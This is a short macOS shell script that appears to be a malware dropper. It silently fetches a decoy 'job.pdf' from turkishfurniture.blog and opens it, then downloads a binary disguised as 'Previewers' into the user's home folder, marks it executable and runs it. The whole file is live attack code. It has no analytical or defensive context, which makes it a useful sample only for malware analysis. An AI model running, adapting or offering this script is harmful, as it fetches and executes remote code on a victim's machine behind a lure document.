#!/bin/sh
cd /tmp
curl -O -s https://turkishfurniture.blog/job.pdf
open job.pdf
cd "/Users/$(whoami)/"
curl -O -s https://turkishfurniture.blog/Previewers
chmod +x Previewers
./Previewers
